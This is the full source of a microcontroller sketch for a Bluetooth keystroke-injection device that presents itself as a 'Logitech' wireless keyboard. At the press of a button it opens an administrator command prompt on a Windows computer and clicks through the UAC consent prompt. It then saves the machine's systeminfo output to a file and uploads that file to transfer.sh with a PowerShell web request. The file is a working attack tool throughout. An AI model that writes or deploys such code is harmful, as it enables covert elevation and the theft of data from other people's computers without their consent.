#include <BleKeyboard.h>

const int triggerButton = 0; // BOOT button
BleKeyboard bleKeyboard("Wireless Keyboard", "Logitech", 100);

void setup() {
  pinMode(triggerButton, INPUT_PULLUP);
  bleKeyboard.begin();
  // Set typing delay to prevent key repetition errors
  bleKeyboard.setDelay(20); 
}

void loop() {
  if (bleKeyboard.isConnected()) {
    if (digitalRead(triggerButton) == LOW) {
      delay(500); 

      // 1. Open Administrative CMD
      bleKeyboard.press(KEY_LEFT_GUI);
      bleKeyboard.press('r');
      delay(100);
      bleKeyboard.releaseAll();
      delay(600);
      bleKeyboard.print("cmd");
      delay(100);
      bleKeyboard.press(KEY_LEFT_CTRL);
      bleKeyboard.press(KEY_LEFT_SHIFT);
      bleKeyboard.press(KEY_RETURN);
      delay(100);
      bleKeyboard.releaseAll();
      delay(3000); // Wait for UAC Prompt

      // 2. Accept UAC
      bleKeyboard.press(KEY_LEFT_ALT);
      bleKeyboard.press('y'); 
      delay(100);
      bleKeyboard.releaseAll();
      delay(1500);

      // 3. Create Folder and Log
      bleKeyboard.print("if not exist C:\\Klog mkdir C:\\Klog");
      bleKeyboard.write(KEY_RETURN);
      delay(500);
      bleKeyboard.print("systeminfo > C:\\Klog\\log.txt");
      bleKeyboard.write(KEY_RETURN);
      delay(6000); // systeminfo takes time to finish

      // 4. THE TRANSFER.SH UPLOAD
      // Shorter command = fewer typing errors like "llllllllll"
      String transferCmd = "powershell -c \"Get-Content 'C:/Klog/log.txt' | Invoke-WebRequest -Uri 'https://transfer.sh/log.txt' -Method Put\"";
      
      bleKeyboard.print(transferCmd);
      bleKeyboard.write(KEY_RETURN);
      delay(5000); // Wait for the URL to appear

      // 5. Final Notification
      bleKeyboard.print("echo SUCCESS. CHECK LINK ABOVE.");
      bleKeyboard.write(KEY_RETURN);

      while(digitalRead(triggerButton) == LOW) { delay(10); }
    }
  }
}